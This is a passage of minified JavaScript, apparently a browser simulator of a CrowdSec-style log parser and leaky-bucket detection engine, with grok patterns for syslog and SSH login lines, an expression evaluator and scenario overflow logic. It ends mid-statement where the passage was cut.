DAY (?:Mon(?:day)?|Tue(?:sday)?|Wed(?:nesday)?|Thu(?:rsday)?|Fri(?:day)?|Sat(?:urday)?|Sun(?:day)?)
YEAR (?:\\d\\d){1,2}
HOUR (?:2[0123]|[01]?[0-9])
MINUTE (?:[0-5][0-9])
SECOND (?:(?:[0-5]?[0-9]|60)(?:[:.,][0-9]+)?)
TIME (?:%{HOUR}:%{MINUTE}(?::%{SECOND}))
DATE_US %{MONTHNUM}[/-]%{MONTHDAY}[/-]%{YEAR}
DATE_EU %{MONTHDAY}[./-]%{MONTHNUM}[./-]%{YEAR}
ISO8601_TIMEZONE (?:Z|[+-]%{HOUR}:?%{MINUTE})
ISO8601_SECOND (?:%{SECOND}|60)
TIMESTAMP_ISO8601 %{YEAR}-%{MONTHNUM2}-%{MONTHDAY}[T ]%{HOUR}:?%{MINUTE}(?::?%{ISO8601_SECOND})?%{ISO8601_TIMEZONE}?
DATE %{DATE_US}|%{DATE_EU}
DATESTAMP %{DATE}[- ]%{TIME}
TZ (?:[APMCE][SD]T|UTC)
DATESTAMP_RFC822 %{DAY} %{MONTH} %{MONTHDAY} %{YEAR} %{TIME} %{TZ}
DATESTAMP_RFC2822 %{DAY}, %{MONTHDAY} %{MONTH} %{YEAR} %{TIME} %{ISO8601_TIMEZONE}
DATESTAMP_OTHER %{DAY} %{MONTH} %{MONTHDAY} %{TIME} %{TZ} %{YEAR}
DATESTAMP_EVENTLOG %{YEAR}%{MONTHNUM2}%{MONTHDAY}%{HOUR}%{MINUTE}%{SECOND}
HTTPDATE %{MONTHDAY}/%{MONTH}/%{YEAR}:%{TIME} %{INT}
# Syslog
SYSLOGTIMESTAMP %{MONTH} +%{MONTHDAY} %{TIME}
PROG (?:[\\w._/%-]+)
SYSLOGPROG %{PROG:program}(?:\\[%{POSINT:pid}\\])?
SYSLOGHOST %{IPORHOST}
SYSLOGFACILITY <%{NONNEGINT:facility}(?:\\.%{NONNEGINT:priority})?>
SYSLOGBASE %{SYSLOGTIMESTAMP:timestamp} (?:%{SYSLOGFACILITY} )?%{SYSLOGHOST:logsource} %{SYSLOGPROG}:
SYSLOGBASE2 (?:%{SYSLOGTIMESTAMP:timestamp}|%{TIMESTAMP_ISO8601:timestamp8601}) (?:%{SYSLOGFACILITY} )?%{SYSLOGHOST:logsource}+(?: %{SYSLOGPROG}:|)
SYSLOGLINE %{SYSLOGBASE2} %{GREEDYDATA:message}
# HTTP
NGINXERRTIME %{YEAR}/%{MONTHNUM2}/%{MONTHDAY} %{TIME}
# SSH
SSHD_FAIL Failed %{WORD:sshd_auth_type} for %{USERNAME:sshd_invalid_user} from %{IP:sshd_client_ip} port %{NUMBER:sshd_port} %{WORD:sshd_protocol}
SSHD_SUCCESS Accepted %{WORD:sshd_auth_type} for %{USERNAME:sshd_user} from %{IP:sshd_client_ip} port %{NUMBER:sshd_port} %{WORD:sshd_protocol}
SSHD_DISCONNECT Received disconnect from %{IP:sshd_client_ip} port %{NUMBER:sshd_port}:%{NUMBER}:%{GREEDYDATA}
SSHD_CONN_CLOSE Connection closed by %{IP:sshd_client_ip}
`)}}function Ze(e){const r={};for(const[n,i]of Object.entries(e)){const t=n.replace(/__\d+$/,"");(!(t in r)||i!==void 0&&i!=="")&&(r[t]=i)}return r}const Ae=new hi;Ae.loadPatternText(Ii);function qr(e,r){try{const n=Ni(e),t=new mi(n).parseExpr();return C(t,r)}catch{return}}function q(e,r){return!!qr(e,r)}function re(e,r){const n=qr(e,r);return n==null?"":String(n)}function Ni(e){const r=[];let n=0;for(;n<e.length;){const i=e[n];if(/\s/.test(i)){n++;continue}if(/[0-9]/.test(i)||i==="-"&&/[0-9]/.test(e[n+1]??"")){let t=n;for(e[t]==="-"&&t++;t<e.length&&/[0-9.]/.test(e[t]);)t++;r.push({kind:"NUM",value:e.slice(n,t)}),n=t;continue}if(i==='"'||i==="'"){const t=i;let o=n+1,s="";for(;o<e.length&&e[o]!==t;)e[o]==="\\"&&o+1<e.length?(s+=e[o+1],o+=2):s+=e[o++];r.push({kind:"STR",value:s}),n=o+1;continue}if(e[n]==="!"&&e[n+1]==="="){r.push({kind:"NEQ",value:"!="}),n+=2;continue}if(e[n]==="="&&e[n+1]==="="){r.push({kind:"EQ",value:"=="}),n+=2;continue}if(e[n]==="<"&&e[n+1]==="="){r.push({kind:"LTE",value:"<="}),n+=2;continue}if(e[n]===">"&&e[n+1]==="="){r.push({kind:"GTE",value:">="}),n+=2;continue}if(e[n]==="&"&&e[n+1]==="&"){r.push({kind:"AND",value:"&&"}),n+=2;continue}if(e[n]==="|"&&e[n+1]==="|"){r.push({kind:"OR",value:"||"}),n+=2;continue}if(i==="<"){r.push({kind:"LT",value:"<"}),n++;continue}if(i===">"){r.push({kind:"GT",value:">"}),n++;continue}if(i==="!"){r.push({kind:"NOT",value:"!"}),n++;continue}if(i==="."){r.push({kind:"DOT",value:"."}),n++;continue}if(i==="["){r.push({kind:"LBRACKET",value:"["}),n++;continue}if(i==="]"){r.push({kind:"RBRACKET",value:"]"}),n++;continue}if(i==="("){r.push({kind:"LPAREN",value:"("}),n++;continue}if(i===")"){r.push({kind:"RPAREN",value:")"}),n++;continue}if(i===","){r.push({kind:"COMMA",value:","}),n++;continue}if(i==="?"){r.push({kind:"QUESTION",value:"?"}),n++;continue}if(i===":"){r.push({kind:"COLON",value:":"}),n++;continue}if(i==="+"){r.push({kind:"PLUS",value:"+"}),n++;continue}if(i==="-"){r.push({kind:"MINUS",value:"-"}),n++;continue}if(i==="*"){r.push({kind:"STAR",value:"*"}),n++;continue}if(i==="/"){r.push({kind:"SLASH",value:"/"}),n++;continue}if(i==="%"){r.push({kind:"PERCENT",value:"%"}),n++;continue}if(/[a-zA-Z_]/.test(i)){let t=n;for(;t<e.length&&/[a-zA-Z0-9_]/.test(e[t]);)t++;const o=e.slice(n,t);if(o==="true"){r.push({kind:"BOOL",value:"true"}),n=t;continue}if(o==="false"){r.push({kind:"BOOL",value:"false"}),n=t;continue}if(o==="nil"||o==="null"){r.push({kind:"NULL",value:o}),n=t;continue}if(o==="in"){r.push({kind:"IN",value:"in"}),n=t;continue}if(o==="not"){let s=t;for(;s<e.length&&e[s]===" ";)s++;if(e.slice(s,s+2)==="in"){r.push({kind:"NOTIN",value:"not in"}),n=s+2;continue}r.push({kind:"NOT",value:"not"}),n=t;continue}r.push({kind:"IDENT",value:o}),n=t;continue}n++}return r.push({kind:"EOF",value:""}),r}class mi{constructor(r){this.tokens=r,this.pos=0}peek(){return this.tokens[this.pos]}consume(){return this.tokens[this.pos++]}expect(r){const n=this.consume();if(n.kind!==r)throw new Error(`Expected ${r}, got ${n.kind} (${n.value})`);return n}parseExpr(){return this.parseTernary()}parseTernary(){const r=this.parseOr();if(this.peek().kind==="QUESTION"){this.consume();const n=this.parseExpr();this.expect("COLON");const i=this.parseExpr();return{t:"ternary",cond:r,then:n,else_:i}}return r}parseOr(){let r=this.parseAnd();for(;this.peek().kind==="OR";)this.consume(),r={t:"binary",op:"||",left:r,right:this.parseAnd()};return r}parseAnd(){let r=this.parseNot();for(;this.peek().kind==="AND";)this.consume(),r={t:"binary",op:"&&",left:r,right:this.parseNot()};return r}parseNot(){return this.peek().kind==="NOT"?(this.consume(),{t:"unary",op:"!",expr:this.parseNot()}):this.parseComparison()}parseComparison(){let r=this.parseInExpr();const n=["EQ","NEQ","LT","LTE","GT","GTE"];for(;n.includes(this.peek().kind);)r={t:"binary",op:this.consume().value,left:r,right:this.parseInExpr()};return r}parseInExpr(){let r=this.parseAddSub();return this.peek().kind==="IN"?(this.consume(),{t:"binary",op:"in",left:r,right:this.parseAddSub()}):this.peek().kind==="NOTIN"?(this.consume(),{t:"unary",op:"!",expr:{t:"binary",op:"in",left:r,right:this.parseAddSub()}}):r}parseAddSub(){let r=this.parseMulDiv();for(;this.peek().kind==="PLUS"||this.peek().kind==="MINUS";)r={t:"binary",op:this.consume().value,left:r,right:this.parseMulDiv()};return r}parseMulDiv(){let r=this.parseUnary();for(;["STAR","SLASH","PERCENT"].includes(this.peek().kind);)r={t:"binary",op:this.consume().value,left:r,right:this.parseUnary()};return r}parseUnary(){return this.peek().kind==="MINUS"?(this.consume(),{t:"unary",op:"-",expr:this.parsePostfix()}):this.parsePostfix()}parsePostfix(){let r=this.parsePrimary();for(;;)if(this.peek().kind==="DOT"){this.consume();const n=this.expect("IDENT").value;if(this.peek().kind==="LPAREN"){this.consume();const i=this.parseArgList();this.expect("RPAREN"),r={t:"method",obj:r,method:n,args:i}}else r={t:"field",obj:r,key:{t:"str",v:n}}}else if(this.peek().kind==="LBRACKET"){this.consume();const n=this.parseExpr();this.expect("RBRACKET"),r={t:"field",obj:r,key:n}}else break;return r}parseArgList(){const r=[];if(this.peek().kind==="RPAREN")return r;for(r.push(this.parseExpr());this.peek().kind==="COMMA";)this.consume(),r.push(this.parseExpr());return r}parsePrimary(){const r=this.peek();if(r.kind==="NUM")return this.consume(),{t:"num",v:parseFloat(r.value)};if(r.kind==="STR")return this.consume(),{t:"str",v:r.value};if(r.kind==="BOOL")return this.consume(),{t:"bool",v:r.value==="true"};if(r.kind==="NULL")return this.consume(),{t:"null"};if(r.kind==="LPAREN"){this.consume();const n=this.parseExpr();return this.expect("RPAREN"),n}if(r.kind==="LBRACKET"){this.consume();const n=[];if(this.peek().kind!=="RBRACKET")for(n.push(this.parseExpr());this.peek().kind==="COMMA";)this.consume(),n.push(this.parseExpr());return this.expect("RBRACKET"),{t:"array",items:n}}if(r.kind==="IDENT"){if(this.consume(),this.peek().kind==="LPAREN"){this.consume();const n=this.parseArgList();return this.expect("RPAREN"),{t:"call",fn:r.value,args:n}}return{t:"ident",v:r.value}}return this.consume(),{t:"null"}}}function C(e,r){switch(e.t){case"num":return e.v;case"str":return e.v;case"bool":return e.v;case"null":return null;case"ident":return e.v in r?r[e.v]:void 0;case"field":{const n=C(e.obj,r),i=C(e.key,r);return n==null?void 0:typeof i=="string"||typeof i=="number"?n[i]:void 0}case"array":return e.items.map(n=>C(n,r));case"unary":return e.op==="!"?!C(e.expr,r):e.op==="-"?-C(e.expr,r):void 0;case"ternary":return C(e.cond,r)?C(e.then,r):C(e.else_,r);case"call":return Ci(e.fn,e.args.map(n=>C(n,r)),r);case"method":{const n=C(e.obj,r),i=e.args.map(t=>C(t,r));return Ri(e.method,n,i)}case"binary":{const n=e.op;if(n==="&&")return!!C(e.left,r)&&!!C(e.right,r);if(n==="||")return!!C(e.left,r)||!!C(e.right,r);const i=C(e.left,r),t=C(e.right,r);return n==="in"?Array.isArray(t)?t.includes(i):typeof t=="object"&&t!==null?i in t:typeof t=="string"?t.includes(i):!1:n==="=="?i===t||String(i)===String(t):n==="!="?i!==t&&String(i)!==String(t):n==="<"?i<t:n==="<="?i<=t:n===">"?i>t:n===">="?i>=t:n==="+"?typeof i=="string"||typeof t=="string"?String(i??"")+String(t??""):i+t:n==="-"?i-t:n==="*"?i*t:n==="/"?t!==0?i/t:0:n==="%"?i%t:void 0}}}function Ri(e,r,n){if(typeof r=="string"){if(e==="startsWith")return r.startsWith(n[0]);if(e==="endsWith")return r.endsWith(n[0]);if(e==="contains")return r.includes(n[0]);if(e==="matches")try{return new RegExp(n[0]).test(r)}catch{return!1}if(e==="hasPrefix")return r.startsWith(n[0]);if(e==="hasSuffix")return r.endsWith(n[0]);if(e==="toLower")return r.toLowerCase();if(e==="toUpper")return r.toUpperCase();if(e==="trimSpace")return r.trim();if(e==="len")return r.length}if(Array.isArray(r)&&e==="len")return r.length;if(typeof r=="object"&&r!==null&&e==="contains")return n[0]in r}function Ci(e,r,n={}){switch(e){case"len":{const i=r[0];return typeof i=="string"||Array.isArray(i)?i.length:typeof i=="object"&&i!==null?Object.keys(i).length:0}case"Upper":return typeof r[0]=="string"?r[0].toUpperCase():"";case"Lower":return typeof r[0]=="string"?r[0].toLowerCase():"";case"string":return String(r[0]??"");case"int":return parseInt(String(r[0]??"0"),10);case"float":return parseFloat(String(r[0]??"0"));case"KeyExists":{const i=r[0],t=r[1];return!t||typeof t!="object"?!1:i in t}case"IpInRange":{const i=r[0],t=r[1];return Di(i,t)}case"ToString":return String(r[0]??"");case"Atof":return parseFloat(String(r[0]??"0"));case"sprintf":case"Sprintf":{let i=String(r[0]??""),t=1;return i=i.replace(/%[sdf]/g,()=>String(r[t++]??"")),i}case"UnmarshalJSON":{const i=String(r[0]??""),t=r[1],o=String(r[2]??"");try{const s=JSON.parse(i),a=n.evt;return a&&typeof a.Unmarshaled=="object"&&a.Unmarshaled!==null?a.Unmarshaled[o]=s:t&&typeof t=="object"&&(t[o]=s),""}catch{return"parse error"}}default:return}}function Di(e,r){try{const[n,i]=r.split("/"),t=parseInt(i,10);if(isNaN(t))return!1;const o=er(e),s=er(n);if(o===null||s===null)return!1;const a=t===0?0:-1<<32-t>>>0;return(o&a)===(s&a)}catch{return!1}}function er(e){const r=e.split(".");if(r.length!==4)return null;const n=r.map(Number);return n.some(isNaN)?null:(n[0]<<24|n[1]<<16|n[2]<<8|n[3])>>>0}const He={Jan:1,Feb:2,Mar:3,Apr:4,May:5,Jun:6,Jul:7,Aug:8,Sep:9,Oct:10,Nov:11,Dec:12,January:1,February:2,March:3,April:4,June:6,July:7,August:8,September:9,October:10,November:11,December:12};function gi(e){if(e=e.trim(),!e)return null;const r=Li(e);if(r)return r;const n=Pi(e);if(n)return n;const i=vi(e);if(i)return i;const t=yi(e);if(t)return t;const o=Mi(e);if(o)return o;const s=xi(e);return s||null}function X(e){return isNaN(e.getTime())?null:{iso:e.toISOString(),date:e}}function Li(e){if(/^\d{4}[-\/]\d{2}[-\/]\d{2}/.test(e)){const r=e.replace(/\//g,"-"),n=new Date(r);return X(n)}return null}function Pi(e){const r=e.match(/^(\d{2})\/(\w{3})\/(\d{4}):(\d{2}):(\d{2}):(\d{2})\s*([+-]\d{4})?/);if(!r)return null;const n=He[r[2]];if(!n)return null;const i=r[7]?r[7].slice(0,3)+":"+r[7].slice(3):"Z",t=`${r[3]}-${String(n).padStart(2,"0")}-${r[1]}T${r[4]}:${r[5]}:${r[6]}${i}`;return X(new Date(t))}function vi(e){const r=e.match(/^\w{3}\s+(\w{3})\s+(\d{1,2})\s+(\d{2}):(\d{2}):(\d{2})(?:\.\d+)?\s+(\d{4})/);if(!r)return null;const n=He[r[1]];if(!n)return null;const i=`${r[6]}-${String(n).padStart(2,"0")}-${r[2].padStart(2,"0")}T${r[3]}:${r[4]}:${r[5]}Z`;return X(new Date(i))}function yi(e){const r=e.match(/^(\w{3})\s+(\d{1,2})\s+(\d{2}):(\d{2}):(\d{2})/);if(!r)return null;const n=He[r[1]];if(!n)return null;const t=`${new Date().getUTCFullYear()}-${String(n).padStart(2,"0")}-${r[2].padStart(2,"0")}T${r[3]}:${r[4]}:${r[5]}Z`;return X(new Date(t))}function Mi(e){const r=e.match(/^(\d{2})\/(\d{2})\/(\d{4})(?:\s+(\d{2}):(\d{2}):(\d{2}))?/);if(!r)return null;const n=r[4]?`T${r[4]}:${r[5]}:${r[6]}Z`:"T00:00:00Z",i=`${r[3]}-${r[1]}-${r[2]}${n}`;return X(new Date(i))}function xi(e){if(!/^\d+(\.\d+)?$/.test(e))return null;const r=parseFloat(e);return isNaN(r)?null:X(new Date(r*1e3))}function Gi(e){if(e){const n=gi(e);if(n)return n}const r=new Date;return{iso:r.toISOString(),date:r}}function Ui(e,r="s01-parse"){const n=Vr.loadAll(e),i=[];for(const t of n){if(!t||typeof t!="object")continue;Kr(t.pattern_syntax??{});const o=Xr(t,r);o&&i.push(o)}return i}function Kr(e){for(const[r,n]of Object.entries(e))Ae.addPattern(r,n);return Ae}function Xr(e,r,n){const i=e.stage??r,t=Kr(e.pattern_syntax??{}),o=[];for(const c of e.nodes??[]){const u=Xr(c,i);u&&o.push(u)}let s;e.grok&&(s=Hi(e.grok,t));const a=(e.statics??[]).map(c=>({config:c}));let l;return e.whitelist&&(l={reason:e.whitelist.reason??"",ips:new Set(e.whitelist.ip??[]),cidrs:e.whitelist.cidr??[],expressions:e.whitelist.expression??[]}),!s&&o.length===0&&a.length===0&&!l&&!e.filter?null:{name:e.name??"",stage:i,filter:e.filter??"",onsuccess:e.onsuccess??"continue",leaves:o,grok:s,statics:a,whitelist:l,localGrok:t}}function Hi(e,r){let n=/(?!)/,i;e.pattern?(i=e.pattern,n=r.compile(e.pattern)):e.name&&(i=`%{${e.name}}`,n=r.compile(`%{${e.name}}`));const t=(e.statics??[]).map(o=>({config:o}));return{applyOn:e.apply_on??"Line.Raw",patternExpr:i,expressionSrc:e.expression,regex:n,statics:t}}function wi(e,r,n){if(n.length===0)return e;e.Stage||(e.Stage=n[0]),e.Process=!1,console.groupCollapsed(`[parser] line: ${JSON.stringify(e.Line.Raw.slice(0,120))}`);for(const i of n){const t=n.indexOf(e.Stage),o=n.indexOf(i);if(t>o)continue;if(e.Stage!==i)return console.info(`[parser]   stage ${i}: SKIP (event stuck at stage ${e.Stage})`),e.Process=!1,console.groupEnd(),e;const s=r.get(i)??[];let a=!1;console.groupCollapsed(`[parser]   stage ${i} (${s.length} node(s))`);for(const l of s){if(Jr(l,e)){if(a=!0,console.info(`[parser]     node "${l.name||"(anon)"}" → MATCH  parsed=%o`,{...e.Parsed}),l.onsuccess==="next_stage"){const u=n[n.indexOf(i)+1];u&&(e.Stage=u,console.info(`[parser]     onsuccess=next_stage → advancing to ${u}`));break}}else console.info(`[parser]     node "${l.name||"(anon)"}" → no match`);if(e.Stage!==i)break}if(!a)return console.info(`[parser]   stage ${i}: FAILED — event discarded`),console.groupEnd(),e.Process=!1,console.groupEnd(),e;console.info(`[parser]   stage ${i}: OK`),console.groupEnd()}return e.Process=!0,console.info("[parser] → PARSED  Process=true  parsed=%o  meta=%o",{...e.Parsed},{...e.Meta}),console.groupEnd(),e}function Jr(e,r){const n=e.name||"(anon)";if(e.filter){if(!q(e.filter,_e(r)))return console.info(`[parser]       "${n}" filter "${e.filter}" → false, skip`),!1;console.info(`[parser]       "${n}" filter "${e.filter}" → true`)}e.whitelist&&(bi(e.whitelist,r),r.Whitelisted&&console.info(`[parser]       "${n}" WHITELISTED (reason: ${e.whitelist.reason})`));let i=!1,t=!0;if(e.grok){const[o,s]=Fi(e.grok,r,n);t=o,i=s}if(e.leaves.length>0&&(t=Bi(e,r,t,i)),!t)return!1;for(const o of e.statics)jr(o.config,r,n);return!0}function Fi(e,r,n=""){let i;e.expressionSrc?i=re(e.expressionSrc,_e(r)):e.applyOn==="Line.Raw"?i=r.Line.Raw:i=r.Parsed[e.applyOn]??"";const t=e.patternExpr??e.expressionSrc??"(regex)",o=e.expressionSrc?`expr(${e.expressionSrc})`:e.applyOn;if(!i)return console.info(`[parser]       "${n}" grok apply_on="${o}" → empty input, skip`),[!1,!1];const s=Ae.matchRegex(e.regex,i);if(!s)return console.info(`[parser]       "${n}" grok pattern="${t}" apply_on="${o}" → NO MATCH  input=${JSON.stringify(i.slice(0,120))}`),[!1,!1];const a={};for(const[l,c]of Object.entries(s))c!==void 0&&c!==""&&(r.Parsed[l]=c,a[l]=c);console.info(`[parser]       "${n}" grok pattern="${t}" → MATCH  captured=%o`,a);for(const l of e.statics)jr(l.config,r,n);return[!0,!0]}function Bi(e,r,n,i){let t=n;for(const o of e.leaves)if(Jr(o,r)){if(t=!0,e.onsuccess==="next_stage")break}else i||(t=!1);return t}function bi(e,r){const n=r.Meta.source_ip??r.Parsed.source_ip??"";if(n&&e.ips.has(n)){r.Whitelisted=!0;return}for(const i of e.expressions)if(q(i,_e(r))){r.Whitelisted=!0;return}}function jr(e,r,n=""){const i=_e(r);let t="";if(e.value!==void 0&&e.value!=="")t=e.value;else if(e.expression)t=re(e.expression,i);else if(e.method){const o=e.expression?re(e.expression,i):e.value??"";console.info(`[parser]       "${n}" static method=${e.method}  input=${JSON.stringify(o)}`),Yi(e.method,o,r);return}if(!(t===""&&e.method!=="ParseDate"))if(e.target){const o=e.target.replace(/^evt\./,"");console.info(`[parser]       "${n}" static target="${e.target}" = ${JSON.stringify(t)}`),ki(r,o,t)}else e.parsed?(console.info(`[parser]       "${n}" static parsed["${e.parsed}"] = ${JSON.stringify(t)}`),r.Parsed[e.parsed]=t):e.meta?(console.info(`[parser]       "${n}" static meta["${e.meta}"] = ${JSON.stringify(t)}`),r.Meta[e.meta]=t):e.enriched&&(console.info(`[parser]       "${n}" static enriched["${e.enriched}"] = ${JSON.stringify(t)}`),r.Enriched[e.enriched]=t)}function Yi(e,r,n){if(e==="ParseDate"){const i=Gi(r||n.StrTime);n.MarshaledTime=i.iso,n.Time=i.date;return}if(e==="UnmarshalJSON"){try{n.Unmarshaled=JSON.parse(r)}catch{}return}}function ki(e,r,n){if(r==="StrTime"){e.StrTime=n;return}if(r==="MarshaledTime"){e.MarshaledTime=n;return}if(r==="Process"){e.Process=n==="true";return}const i=r.indexOf(".");if(i!==-1){const t=r.slice(0,i),o=r.slice(i+1),s=e[t];s&&typeof s=="object"&&(s[o]=n)}}function _e(e){return{evt:e}}function Wi(e){const r=new Map;for(const i of e){const t=r.get(i.stage)??[];t.push(i),r.set(i.stage,t)}return[Array.from(r.keys()).sort(),r]}function $i(e){const n=new TextEncoder().encode(e);return Vi(n)}function Vi(e){let r=1732584193,n=4023233417,i=2562383102,t=271733878,o=3285377520;const s=e.length,a=s+1+((s+9)%64===0?0:64-(s+9)%64)+8,l=new Uint8Array(a);l.set(e),l[s]=128;const c=s*8;new DataView(l.buffer).setUint32(a-4,c>>>0,!1);const A=new Uint32Array(80);for(let p=0;p<a;p+=64){const _=new DataView(l.buffer,p,64);for(let h=0;h<16;h++)A[h]=_.getUint32(h*4,!1);for(let h=16;h<80;h++)A[h]=he(A[h-3]^A[h-8]^A[h-14]^A[h-16],1);let d=r,E=n,S=i,O=t,f=o;for(let h=0;h<80;h++){let G,U;h<20?(G=E&S|~E&O,U=1518500249):h<40?(G=E^S^O,U=1859775393):h<60?(G=E&S|E&O|S&O,U=2400959708):(G=E^S^O,U=3395469782);const J=he(d,5)+G+f+U+A[h]>>>0;f=O,O=S,S=he(E,30),E=d,d=J}r=r+d>>>0,n=n+E>>>0,i=i+S>>>0,t=t+O>>>0,o=o+f>>>0}return[r,n,i,t,o].map(p=>p.toString(16).padStart(8,"0")).join("")}function he(e,r){return(e<<r|e>>>32-r)>>>0}function Le(e){if(!e)return 0;let r=0;const n=/(\d+(?:\.\d+)?)\s*(ms|s|m|h|d)/g;let i;for(;(i=n.exec(e))!==null;){const t=parseFloat(i[1]);switch(i[2]){case"ms":r+=t;break;case"s":r+=t*1e3;break;case"m":r+=t*60*1e3;break;case"h":r+=t*3600*1e3;break;case"d":r+=t*86400*1e3;break}}return r}function qi(e,r){const n=Vr.loadAll(e),i=[];for(const t of n){if(!t||typeof t!="object"||!t.name)continue;const o={spec:t,leakspeedMs:Le(t.leakspeed??""),durationMs:Le(t.duration??""),overflowChan:r};i.push(o)}return i}function Ki(e,r){const n=e.spec,i=n.capacity??0;return{factory:e,mapkey:r,tokens:i,capacity:i,lastRefillTime:null,queue:[],firstTs:null,lastTs:null,ovflwTs:null,totalCount:0,overflowed:!1,canceled:!1,durationDeadline:null,timedOverflow:e.durationMs>0,conditionalOverflow:n.type==="conditional",distinctSeen:new Set,blackholeExpiry:null,bayesianProb:n.bayesian_prior??0}}class Xi{constructor(){this.store=new Map}get(r){return this.store.get(r)}set(r,n){this.store.set(r,n)}delete(r){this.store.delete(r)}getOrCreate(r,n){let i=this.store.get(r);return i||(i=Ki(n,r),this.store.set(r,i)),i}snapshot(){return Array.from(this.store.values())}size(){return this.store.size}clear(){this.store.clear()}serialize(){const r=Array.from(this.store.entries()).map(([n,i])=>{var t,o;return{key:n,scenario:i.factory.spec.name,mapkey:i.mapkey,tokens:i.tokens,capacity:i.capacity,firstTs:((t=i.firstTs)==null?void 0:t.toISOString())??null,lastTs:((o=i.lastTs)==null?void 0:o.toISOString())??null,totalCount:i.totalCount,overflowed:i.overflowed,queueLen:i.queue.length}});return JSON.stringify(r,null,2)}}function Ji(e,r){const n=e.factory.spec,i=e.capacity;if(n.type==="trigger")return!1;if(i===-1)return!0;if(e.lastRefillTime!==null&&e.factory.leakspeedMs>0){const t=r.getTime()-e.lastRefillTime.getTime();if(t>0){const o=t/e.factory.leakspeedMs;e.tokens=Math.min(i,e.tokens+o)}}return e.lastRefillTime=r,e.tokens>=1?(e.tokens-=1,!0):!1}function ji(e,r,n){let i=!1;const t=e.Time??new Date;console.groupCollapsed(`[bucket] pour  src=${e.Meta.source_ip??"?"}  t=${t.toISOString()}`);for(const o of r){const s=o.spec;if(s.filter&&!q(s.filter,ue(e))){console.info(`[bucket]   scenario "${s.name}" filter="${s.filter}" → false, skip`);continue}let a="";s.groupby&&(a=re(s.groupby,ue(e)));const l=eo(s.filter??"",a,s.name),c=n.get(l)!==void 0,u=n.getOrCreate(l,o);c||console.info(`[bucket]   scenario "${s.name}" groupby="${a}" → BUCKET CREATED  key=${l.slice(0,8)}`);const A=Qi(u,e,t);console.info(`[bucket]   scenario "${s.name}" groupby="${a}" → poured  count=${u.totalCount}  tokens=${u.tokens.toFixed(2)}/${u.capacity}  overflow=${A}`),A&&zi(u,o,n),i=!0}return console.groupEnd(),i}function Qi(e,r,n){const i=e.factory.spec,t=i.name;if(i.distinct){const s=re(i.distinct,ue(r));if(e.distinctSeen.has(s))return console.info(`[bucket]     "${t}" DISTINCT duplicate val="${s}", discard`),!1;e.distinctSeen.add(s),console.info(`[bucket]     "${t}" DISTINCT new val="${s}"`)}if(i.cancel_on&&q(i.cancel_on,ue(r)))return console.info(`[bucket]     "${t}" CANCEL_ON matched → bucket canceled`),e.canceled=!0,!1;if(e.totalCount++,e.firstTs||(e.firstTs=n),e.lastTs=n,!e.durationDeadline&&e.factory.durationMs>0&&(e.durationDeadline=new Date(n.getTime()+e.factory.durationMs),console.info(`[bucket]     "${t}" duration deadline set to ${e.durationDeadline.toISOString()}`)),e.timedOverflow&&e.durationDeadline&&n>e.durationDeadline)return console.info(`[bucket]     "${t}" DURATION EXPIRED → overflow (count=${e.totalCount})`),e.queue.push(r),e.ovflwTs=n,!0;if(Ji(e,n)||e.conditionalOverflow)e.queue.push(r),i.type==="trigger"&&console.info(`[bucket]     "${t}" type=trigger → immediate overflow`);else return console.info(`[bucket]     "${t}" CAPACITY OVERFLOW  tokens=${e.tokens.toFixed(2)}  count=${e.totalCount}`),e.queue.push(r),e.ovflwTs=n,!0;if(e.conditionalOverflow&&i.condition){const s={Queue:e.queue,GetQueue:()=>e.queue,L:e.queue.length};if(q(i.condition,{evt:r,queue:s,leaky:e}))return console.info(`[bucket]     "${t}" CONDITIONAL matched → overflow (count=${e.totalCount})`),e.ovflwTs=n,!0}return!1}function zi(e,r,n){var t;const i=r.spec.name;if(r.spec.blackhole&&e.blackholeExpiry&&e.ovflwTs&&e.blackholeExpiry>e.ovflwTs){console.info(`[bucket]   "${i}" BLACKHOLED until ${e.blackholeExpiry.toISOString()} → overflow discarded, bucket reset`),Ne(e,n);return}if(r.spec.overflow_filter&&!q(r.spec.overflow_filter,{leaky:e,queue:e.queue})){console.info(`[bucket]   "${i}" overflow_filter="${r.spec.overflow_filter}" → false, overflow discarded`),Ne(e,n);return}if(r.spec.blackhole&&e.ovflwTs){const o=Le(r.spec.blackhole);e.blackholeExpiry=new Date(e.ovflwTs.getTime()+o),console.info(`[bucket]   "${i}" blackhole next expiry: ${e.blackholeExpiry.toISOString()}`)}console.info(`[bucket] *** OVERFLOW "${i}"  groupby="${e.mapkey.slice(0,8)}"  events=${e.queue.length}  at=${((t=e.ovflwTs)==null?void 0:t.toISOString())??"?"} ***`),e.overflowed=!0,r.overflowChan.push({factory:r,leaky:e,queue:[...e.queue]}),Ne(e,n)}function Ne(e,r){r.delete(e.mapkey)}function Zi(e,r){for(const n of r.snapshot()){if(n.overflowed||n.canceled){r.delete(n.mapkey);continue}const t=n.factory.spec.capacity??0;if(t<=0)continue;const o=n.factory.leakspeedMs;if(o<=0||!n.lastRefillTime)continue;const s=e.getTime()-n.lastRefillTime.getTime();Math.min(t,n.tokens+s/o)>=t&&r.delete(n.mapkey)}}function ue(e){return{evt:e}}function eo(e,r,n){return $i(`${e}\0${r}\0${n}`)}function ro(e){var E,S,O,f,h,G,U;const{factory:r,leaky:n,queue:i}=e,t=r.spec;if(i.length===0)return null;const o=((E=n.firstTs)==null?void 0:E.toISOString())??new Date().toISOString(),s=((S=n.ovflwTs)==null?void 0:S.toISOString())??((O=n.lastTs)==null?void 0:O.toISOString())??new Date().toISOString(),a=((f=n.lastTs)==null?void 0:f.toISOString())??new Date().toISOString(),l=new Map;for(const J of i){const fe=no(J,((h=t.scope)==null?void 0:h.type)??"Ip");fe&&l.set(fe.value,fe)}const c=Array.from(l.values()),u=i.map(J=>to(J)),A=c.length===0?"UNKNOWN":c.length===1?c[0].value:`${c.length} sources`,p=n.firstTs&&n.ovflwTs?Math.round((n.ovflwTs.getTime()-n.firstTs.getTime())/1e3):0,_=`${((G=t.scope)==null?void 0:G.type)??"Ip"} ${A} performed '${t.name}' (${n.totalCount} events over ${io(p)}) at ${a}`,d=!!((U=t.labels)!=null&&U.remediation);return{mapkey:n.mapkey,scenario:t.name,scenarioDescription:t.description??"",capacity:t.capacity,eventsCount:n.totalCount,leakspeed:t.leakspeed??"",startAt:o,stopAt:s,message:_,sources:c,events:u,labels:t.labels??{},remediation:d,simulated:!1}}function no(e,r){const n=e.Meta.source_ip??e.Parsed.source_ip??"";if(!n&&r==="Ip")return null;const 